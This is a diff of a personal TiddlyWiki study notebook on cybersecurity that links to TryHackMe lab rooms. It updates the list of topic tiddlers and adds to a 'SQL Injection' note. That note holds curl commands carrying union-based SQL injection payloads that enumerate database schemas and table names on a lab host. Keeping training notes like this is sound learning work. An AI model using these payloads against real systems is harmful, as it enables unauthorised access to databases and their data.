@@ -10069,7 +10069,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 <div created="20210810022253593" modified="20210825230930363" title="$:/state/toc/TableOfContents/Tech-Game Development--118161433">
 <pre>close</pre>
 </div>
-<div created="20211203061538368" list="CrappyMakerProgrammer Tech [[Cyber Security]] [[Cyber Security Certifications]]" modified="20211203061817895" title="$:/StoryList">
+<div created="20211203061538368" list="CrappyMakerProgrammer Tech [[Cyber Security]] Exploitation [[Web Hacking]] [[SQL Injection]] [[Cyber Security Certifications]] Pivoting" modified="20211203150439548" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -13354,7 +13354,7 @@ follow symlinks = yes
 wide links = yes
 ```</pre>
 </div>
-<div created="20211101125907368" modified="20211120175053848" title="SQL Injection">
+<div created="20211101125907368" modified="20211203152155676" title="SQL Injection">
 <pre>! Manual SQL Injection
 
 https://tryhackme.com/room/sqlinjectionlm
@@ -13363,6 +13363,7 @@ https://tryhackme.com/room/sqlilab
 Sample queries
 
 ```
+curl 10.10.10.3/results.php -X POST --data-urlencode &quot;search=Mary' order by 1,2,3,4,5,6 -- -&quot;
 curl 10.10.10.3/results.php -X POST --data-urlencode &quot;search=Mary' union select 1,2,3,4,5,6 -- -&quot;
 curl 10.10.10.3/results.php -X POST --data-urlencode &quot;search=0' union select distinct 1,2,3,4,5,group_concat(table_schema) FROM information_schema.tables  -- -&quot;
 curl 10.10.10.3/results.php -X POST --data-urlencode &quot;search=0' union select distinct 1,2,3,4,5,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'users' -- -&quot;
